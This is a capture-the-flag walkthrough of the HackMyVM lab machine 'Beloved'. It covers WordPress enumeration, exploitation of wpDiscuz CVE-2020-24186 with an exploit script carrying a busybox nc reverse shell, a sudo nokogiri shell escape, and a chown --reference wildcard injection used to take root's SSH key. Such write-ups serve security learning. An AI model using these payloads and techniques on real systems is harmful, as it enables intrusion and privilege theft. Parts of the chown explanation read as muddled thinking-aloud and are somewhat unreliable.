# Beloved

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Beloved | cromiphi | Beginner | HackMyVM |

**Summary:**
Beloved is a Beginner-level Linux machine on HackMyVM. The attack begins with network scanning to identify an Apache web server hosting a WordPress site. Vulnerability enumeration via WPScan reveals an outdated "wpDiscuz" plugin susceptible to Remote Code Execution (CVE-2020-24186), which is exploited to gain initial access as `www-data`. Privilege escalation to the user `beloved` is achieved by abusing a sudo capability on a custom Ruby script (`nokogiri`). Root access is finally obtained by exploiting a misconfigured cron job running in `/opt` that allows file ownership manipulation using `chown`, permitting the attacker to seize control of a root SSH private key.

---

## Reconnaissance

The initial network scan identifies the target IP address as `192.168.100.121`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.121 08:00:27:4E:2F:B9 VirtualBox
```

A detailed Nmap scan reveals two open ports: SSH (22) and HTTP (80). The HTTP service is identified as Apache running on Debian, hosting a WordPress site.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ nmap -sC -sV -p- -T4 192.168.100.121
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 09:57 WIB
Nmap scan report for 192.168.100.121
Host is up (0.0053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-generator: WordPress 5.7.2
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Beloved &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.78 seconds
```

We add the target to our hosts file for easier navigation.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ echo '192.168.100.121 beloved' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.121 beloved
```

Checking the web headers confirms the server details.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ curl -I http://beloved
HTTP/1.1 200 OK
Date: Fri, 20 Feb 2026 03:06:24 GMT
Server: Apache/2.4.38 (Debian)
Link: <http://beloved/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```

Visiting the website confirms it is a standard WordPress installation.

![](image.png)

Using `wpscan`, we enumerate the WordPress installation. Key findings include:
- **WordPress Version:** 5.7.2
- **User:** `smart_ass`
- **Plugin:** `wpdiscuz` (version 7.0.4)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ wpscan --url http://beloved/  --plugins-detection aggressive -e u,ap
...
[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
...
[+] wpdiscuz
 | Location: http://beloved/wp-content/plugins/wpdiscuz/
 | Last Updated: 2026-02-09T12:32:00.000Z
 | Readme: http://beloved/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.46
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://beloved/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
...
[+] Enumerating Users (via Passive and Aggressive Methods)
...
[+] smart_ass
 | Found By: Author Posts - Author Pattern (Passive Detection)
...
```

## Initial Access

Researching `wpDiscuz 7.0.4` reveals it is vulnerable to **Remote Code Execution (CVE-2020-24186)** via an arbitrary file upload bypass. We use a Python exploit script, modifying it to inject a reverse shell payload using `busybox nc`.

**Exploit Script Modification:**
```python
def rev_shell_exec():
    rev_cmd = "busybox nc 192.168.100.1 4444 -e /bin/bash"

    print(f'[!] Sending reverse shell command to {main_url}...')
    try:
        print(f'[+] Command sent! Check your netcat listener.')
        session.get(shell + '?cmd=' + rev_cmd)
    except Exception as e:
        print(f'\n[x] Failed to execute: {e}')

banner()
csrfRequest()
nameRandom()
shell_upload()
rev_shell_exec()
```

We set up a listener on port 4444 and run the exploit.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Triggering the exploit:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ python3 wpDiscuz_RemoteCodeExec.py -u http://beloved -p /2021/06/09/hello-world/
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
---------------------------------------------------------------

[+] Response length:[51680] | code:[200]
[!] Got wmuSecurity value: 54bed7ac94
[!] Got wmuSecurity value: 1

[+] Generating random name for Webshell...
[!] Generated webshell name: zczpniiqdnqpvay

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:http://beloved/wp-content/uploads/2026/02/zczpniiqdnqpvay-1771566781.5211.php

[!] Sending reverse shell command to http://beloved...
[+] Command sent! Check your netcat listener.
```

The listener catches the shell as `www-data`. We then upgrade it to a fully interactive TTY.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 63539
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2026/02$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/beloved]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2026/02$ export SHELL=/bin/bash
www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2026/02$ export TERM=xterm
www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2026/02$ stty rows 100 cols 200
www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2026/02$ reset
```

## Privilege Escalation

### User Escalation (www-data -> beloved)

We inspect `/etc/passwd` and identifying a user named `beloved`.

```bash
www-data@beloved:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
beloved:x:1000:1000:,,,:/home/beloved:/bin/bash
```

Checking sudo privileges reveals that `www-data` can execute `/usr/local/bin/nokogiri` as user `beloved` without a password.

```bash
www-data@beloved:/var/www/html$ sudo -l
Matching Defaults entries for www-data on beloved:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on beloved:
    (beloved) NOPASSWD: /usr/local/bin/nokogiri
```

`nokogiri` is a Ruby script. We can abuse it to spawn a shell. When run against a file, it enters an interactive mode. We execute it against `/etc/passwd` and invoke a system shell from within the Ruby `irb` interface.

```bash
www-data@beloved:/var/www/html$ sudo -u beloved /usr/local/bin/nokogiri /etc/passwd
Your document is stored in @doc...
irb(main):001:0>  system("/bin/bash")
beloved@beloved:/var/www/html$ id
uid=1000(beloved) gid=1000(beloved) groups=1000(beloved)
```

We are now the user `beloved`.

### Root Escalation (beloved -> root)

Listing files in `/opt` reveals a directory owned by `root:beloved` with write permissions for the group (`drwxrwx---`). It also contains an `id_rsa` key owned by root.

```bash
beloved@beloved:~$ ls -la /opt
total 12
drwxrwx---  2 root beloved 4096 Jun 27  2021 .
drwxr-xr-x 18 root root    4096 May 19  2021 ..
-rw-------  1 root root    1823 Jun 27  2021 id_rsa
```

To understand what is happening in this directory, we transfer and run `pspy64` to monitor processes.

```bash
beloved@beloved:~$ wget http://192.168.100.1:8080/pspy64
...
beloved@beloved:~$ ./pspy64
...
2026/02/20 07:06:01 CMD: UID=0     PID=2275   | /bin/sh -c cd /opt && chown root:root *
```

`pspy64` captures a cron job running every minute: `cd /opt && chown root:root *`.

The `chown root:root *` command uses a wildcard. This is vulnerable to wildcard injection if we can control filenames in that directory. Since the directory is writable by the group `beloved`, we can create files.

We can exploit the `--reference` flag in `chown` (since `*` expands to filenames). By creating a file named `--reference=root` (where `root` is a file we own), we can trick `chown` into changing the ownership of files to match the ownership of our file (which is `beloved`).

However, the command is `chown root:root *`. It tries to change everything to root. But if we create a file named `--reference=somefile`, `chown` interprets it as a flag.

Wait, the command is `chown root:root *`.
If we create a file named `--reference=beloved_owned_file`, `chown` might ignore the `root:root` argument or process flags first.
Let's check the logic used in the output:

```bash
beloved@beloved:~$ cd /opt
beloved@beloved:/opt$ touch root
beloved@beloved:/opt$ touch -- --reference=root
```

Here, the attacker created a file named `root` (owned by `beloved` because the attacker created it).
Then they created a file named `--reference=root`.
When the cron job runs `chown root:root *`, the shell expands `*`. The command becomes roughly:
`chown root:root --reference=root id_rsa root ...`

`chown` parses arguments. `--reference=root` tells `chown` to use the owner/group of the file named `root` (which is `beloved:beloved`) and apply it to the other files in the list. This overrides the explicit `root:root` specified earlier in the command line (or causes it to apply the reference permissions instead).

```bash
beloved@beloved:/opt$ ls -la
total 12
-rw-r--r--  1 beloved beloved    0 Feb 20 07:08 '--reference=root'
drwxrwx---  2 root    beloved 4096 Feb 20 07:08  .
drwxr-xr-x 18 root    root    4096 May 19  2021  ..
-rw-------  1 root    root    1823 Jun 27  2021  id_rsa
-rw-r--r--  1 beloved beloved    0 Feb 20 07:08  root
```
After the cron job runs:

```bash
beloved@beloved:/opt$ ls -la
total 12
-rw-r--r--  1 beloved beloved    0 Feb 20 07:08 '--reference=root'
drwxrwx---  2 root    beloved 4096 Feb 20 07:08  .
drwxr-xr-x 18 root    root    4096 May 19  2021  ..
-rw-------  1 beloved beloved 1823 Jun 27  2021  id_rsa
-rw-r--r--  1 beloved beloved    0 Feb 20 07:08  root
```

The `id_rsa` file is now owned by `beloved`. We can read it and use it to SSH as root.

```bash
beloved@beloved:/opt$ ssh -i id_rsa root@localhost
Linux beloved 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
...
root@beloved:~# id
uid=0(root) gid=0(root) groups=0(root)
root@beloved:~# cat /home/beloved/user.txt /root/root.txt
020[REDACTED]
d58[REDACTED]
```

## Attack Chain Summary
1. **Reconnaissance**: Discovered Ports 22 and 80 via Nmap. Identified a WordPress 5.7.2 site with `wpDiscuz` plugin.
2. **Vulnerability Discovery**: Identified `wpDiscuz` 7.0.4 is vulnerable to Authenticated Remote Code Execution (CVE-2020-24186) via file upload bypass.
3. **Exploitation**: Exploited the plugin to upload a PHP reverse shell, gaining a foothold as `www-data`.
4. **Internal Enumeration**: Found `sudo` privileges for `www-data` to run `/usr/local/bin/nokogiri` as user `beloved`.
5. **Privilege Escalation (User)**: Abused `nokogiri` (Ruby parser) to spawn a system shell as user `beloved`.
6. **Privilege Escalation (Root)**: Discovered a cron job running `chown root:root *` in `/opt`. Exploited wildcard injection using a `--reference` file to change ownership of a root `id_rsa` key to the current user, then used the key to SSH into the box as root.
